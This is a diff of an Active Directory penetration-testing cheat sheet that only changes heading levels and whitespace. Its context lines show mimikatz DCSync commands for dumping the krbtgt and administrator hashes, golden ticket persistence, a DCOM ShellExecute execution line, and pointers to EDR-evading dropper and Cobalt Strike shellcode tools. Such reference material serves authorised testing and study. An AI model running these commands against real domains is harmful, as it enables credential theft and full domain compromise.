@@ -466,7 +466,7 @@ mimikatz# lsadump::dcsync /domain:fqdn /user:krbtgt
 lsadump::dcsync /domain:contoso.local /dc:dc01 /user:administrator /authuser:dc01$ /authdomain:contoso.local /authpassword:"" /authntlm
 ```
 
-# Persistence
+## Persistence
 
 ### Golden Ticket
 A golden ticket is signed and encrypted by the hash of krbtgt account which makes it a valid TGT ticket. The krbtgt user hash could be used to impersonate any user with any privileges from even a non-domain machine
@@ -634,7 +634,7 @@ PS> $obj.Document.Application.ShellExecute("cmd.exe","/c calc.exe","c:\windows\s
 ### Reference
 * https://dolosgroup.io/blog/remote-access-cheat-sheet
 
-# Generate VBScript dropper (APC process injection)
+## Generate VBScript dropper (APC process injection)
 Make sure to download [GadgetToJScript](https://github.com/med0x2e/GadgetToJScript.git) and [Donut](https://github.com/TheWover/donut.git)._Note:This method probably won't 100% bypass EDR/AV._
 ### Cobalt Strike Beacon
 For cobalt strike, this aggressor script called [**ShellCode Generator**](https://github.com/RCStep/CSSG) is very useful to generate shellcode with custom formatting. This cna also helps to obfuscate with XOR or AES method.
@@ -801,7 +801,6 @@ wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_samaccountname
 # remove a computer account
 net computer \\FakeComputer /delete
 ```
-
 
 ### Reference 
 https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing
